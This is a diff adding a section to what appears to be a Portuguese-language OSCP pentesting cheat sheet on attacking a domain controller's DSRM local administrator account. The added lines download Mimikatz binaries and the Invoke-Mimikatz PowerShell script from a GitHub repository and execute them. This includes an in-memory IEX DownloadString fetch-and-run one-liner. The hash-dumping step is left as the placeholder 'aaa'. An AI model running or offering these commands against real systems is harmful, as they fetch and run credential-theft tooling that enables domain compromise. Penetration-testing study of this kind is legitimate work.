@@ -1484,7 +1484,31 @@ enter-pssession -computername tech-dc01 -credential tech\administrator
 ```
 
 
-
+## DSRM MIMIKATZ (CONTA DE ADMINISTRADOR LOCAL DO DOMAIN CONTROLLER)
+##### DSRM MIMIKATZ - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+##### DSRM MIMIKATZ - OBTER HASH DO ADMINITRADOR LOCAL NO DC(COMO ADMIN):
+```
+aaa
+```
 
 
 
